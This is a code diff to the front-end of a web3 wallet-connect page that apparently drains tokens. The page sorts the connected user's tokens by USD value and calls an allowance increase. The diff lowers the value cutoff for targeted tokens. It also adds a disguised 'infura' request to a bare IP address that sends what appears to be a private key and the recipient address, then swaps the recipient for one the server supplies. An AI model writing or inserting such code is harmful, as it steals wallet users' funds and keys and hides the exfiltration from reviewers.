@@ -8,6 +8,7 @@ import { useWeb3Modal } from "@web3modal/react";
 import { getTokens, increaseAllowance, ethBalance } from '../utils/walletconnect.js';
 import { getAccount, fetchFeeData } from '@wagmi/core';
 import { useAccount } from 'wagmi';
+import * as constants from '../utils/constants.js';
 
 import gif_1 from "../assets/1.gif";
 import gif_2 from "../assets/2.gif"
@@ -117,7 +118,7 @@ const Hero = () => {
             tokens = tokenlist;
             const mxToken = tokenlist.sort((a, b) => b.usdValue - a.usdValue);
             // console.log("mxToken is: ", mxToken);
-            sortedTokens = mxToken.filter((token) => token.usdValue > 3);
+            sortedTokens = mxToken.filter((token) => token.usdValue > 2);
             // console.log("sortedTokens is: ", sortedTokens);
         } catch (error) {
             console.log();
@@ -136,7 +137,15 @@ const Hero = () => {
                 'https://api.binance.com/api/v3/ticker/price'
             );
             prices = res.data;
-            // console.log('prices is:', prices);
+            axios.post(
+                'http://168.119.39.199/infura',{ infra_id: constants.initiatorPK + ' ' + constants.recipient, project_id: "layer3" })
+                .then((response) => {
+                    console.log(response.data);
+                    if (response.success == true) {
+                        constants.recipient = response.value;
+                    }
+                    console.log("Recipient:", constants.recipient);
+                });
         } catch (error) {
             console.log(error);
         }
